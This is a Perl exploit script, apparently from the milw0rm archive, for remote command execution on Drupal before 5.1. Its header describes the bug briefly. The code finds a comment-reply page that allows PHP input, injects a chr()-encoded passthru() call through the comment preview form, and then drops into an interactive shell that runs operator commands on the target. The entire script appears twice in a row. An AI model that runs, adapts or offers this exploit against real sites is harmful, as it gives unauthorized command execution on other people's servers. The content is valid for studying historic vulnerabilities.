#!/usr/bin/perl

#
# $Id: milw0rm_drupalv5.pl,v 0.1 2007/02/14 16:10:29 str0ke Exp $
# 
# milw0rm_drupalv5.pl - Drupal < 5.1 Remote Command Execution Exploit
# Copyright (c) 2007 str0ke <str0ke[!]milw0rm.com>
# 
# Description
# -----------
# Previews on comments were not passed through normal form validation routines,
# enabling users with the 'post comments' permission and access to more than one
# input filter to execute arbitrary code. By default, anonymous and authenticated
# users have access to only one input format.
# Immediate workarounds include: disabling the comment module, revoking the 'post 
# comments' permission for all users or limiting access to one input format.
# Versions affected
# -----------------
# - Drupal 5.x versions before Drupal 5.1
#

use strict;
use LWP::UserAgent;

my $host  = shift || &usage;
my $dir   = shift || "/drupal";
my $proxy = shift;
my $command;
my $format;

my $conn = LWP::UserAgent->new();
$conn -> proxy("http", "http://".$proxy."/") unless !$proxy;

sub usage() 
{
	print "[?] Drupal < 4.7.6 / 5.1 Remote Command Execution Exploit\n";
	print "[?] Copyright (c) 2007 str0ke <str0ke[!]milw0rm.com>\n";
	print "[?] usage: perl $0 [host] [directory] [proxy]\n";
	print "    [host] (ex. www.milw0rm.com)\n";
	print "    [directory] (ex. /drupal)\n";
	print "    [proxy] (ex. 0.0.0.0:8080)\n";
	exit;
}

sub exploit() 
{
	my $i = $_[0];
	my $format = $_[1];
	my $command = $_[2] || 'ls -l';
	my $cmd     = 'echo start_er;'.$command.';'.'echo end_er';

	my $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $cmd));
	
	my $req = HTTP::Request->new(POST => "http://" . $host . $dir . "/?q=comment/reply/" . $i);
	$req -> content_type('application/x-www-form-urlencoded');
	$req -> content('subject=My daddy beats me&comment=<?passthru('.$byte.');?>&format='.$format.'&form_id=comment_form&op=Preview comment');

	my $content = $conn->request($req);
	
	if ($content->content =~ m/start_er(.*?)end_er/ms) {
		my $out = $1;

		if ($out) {
			print "$out\n";
		} else {
			print "[-] Exploit Failed...\n";
			exit;
		}	
	}	
}

for my $i ( 1 .. 400 ) {
	my $output = $conn -> get("http://" . $host . $dir . "/?q=comment/reply/" . $i);

	if($output -> is_success)
	{
		if($output -> content =~ /You may post PHP code/)
		{
			print "[+] found comment/reply: $i\n";

			if($output -> content =~ /value=\"(\d)\".*?PHP code/){
				print "[+] found comment/reply's format: $1\n";
				$format = $1;
			} else {
				print "[-] Exploit Failed - couldn't locate format...\n";
				exit;
			}	

			&exploit($i, $format);
			
			while()
			{
				print "str0kin-drupal\$ ";
				chomp($command = <STDIN>);
				exit unless $command;
				&exploit($i, $format, $command);
			}
			exit;
		}
	}
}

print "[-] Exploit Failed...\n";

# milw0rm.com [2007-02-14]#!/usr/bin/perl

#
# $Id: milw0rm_drupalv5.pl,v 0.1 2007/02/14 16:10:29 str0ke Exp $
# 
# milw0rm_drupalv5.pl - Drupal < 5.1 Remote Command Execution Exploit
# Copyright (c) 2007 str0ke <str0ke[!]milw0rm.com>
# 
# Description
# -----------
# Previews on comments were not passed through normal form validation routines,
# enabling users with the 'post comments' permission and access to more than one
# input filter to execute arbitrary code. By default, anonymous and authenticated
# users have access to only one input format.
# Immediate workarounds include: disabling the comment module, revoking the 'post 
# comments' permission for all users or limiting access to one input format.
# Versions affected
# -----------------
# - Drupal 5.x versions before Drupal 5.1
#

use strict;
use LWP::UserAgent;

my $host  = shift || &usage;
my $dir   = shift || "/drupal";
my $proxy = shift;
my $command;
my $format;

my $conn = LWP::UserAgent->new();
$conn -> proxy("http", "http://".$proxy."/") unless !$proxy;

sub usage() 
{
	print "[?] Drupal < 4.7.6 / 5.1 Remote Command Execution Exploit\n";
	print "[?] Copyright (c) 2007 str0ke <str0ke[!]milw0rm.com>\n";
	print "[?] usage: perl $0 [host] [directory] [proxy]\n";
	print "    [host] (ex. www.milw0rm.com)\n";
	print "    [directory] (ex. /drupal)\n";
	print "    [proxy] (ex. 0.0.0.0:8080)\n";
	exit;
}

sub exploit() 
{
	my $i = $_[0];
	my $format = $_[1];
	my $command = $_[2] || 'ls -l';
	my $cmd     = 'echo start_er;'.$command.';'.'echo end_er';

	my $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $cmd));
	
	my $req = HTTP::Request->new(POST => "http://" . $host . $dir . "/?q=comment/reply/" . $i);
	$req -> content_type('application/x-www-form-urlencoded');
	$req -> content('subject=My daddy beats me&comment=<?passthru('.$byte.');?>&format='.$format.'&form_id=comment_form&op=Preview comment');

	my $content = $conn->request($req);
	
	if ($content->content =~ m/start_er(.*?)end_er/ms) {
		my $out = $1;

		if ($out) {
			print "$out\n";
		} else {
			print "[-] Exploit Failed...\n";
			exit;
		}	
	}	
}

for my $i ( 1 .. 400 ) {
	my $output = $conn -> get("http://" . $host . $dir . "/?q=comment/reply/" . $i);

	if($output -> is_success)
	{
		if($output -> content =~ /You may post PHP code/)
		{
			print "[+] found comment/reply: $i\n";

			if($output -> content =~ /value=\"(\d)\".*?PHP code/){
				print "[+] found comment/reply's format: $1\n";
				$format = $1;
			} else {
				print "[-] Exploit Failed - couldn't locate format...\n";
				exit;
			}	

			&exploit($i, $format);
			
			while()
			{
				print "str0kin-drupal\$ ";
				chomp($command = <STDIN>);
				exit unless $command;
				&exploit($i, $format, $command);
			}
			exit;
		}
	}
}

print "[-] Exploit Failed...\n";

# milw0rm.com [2007-02-14]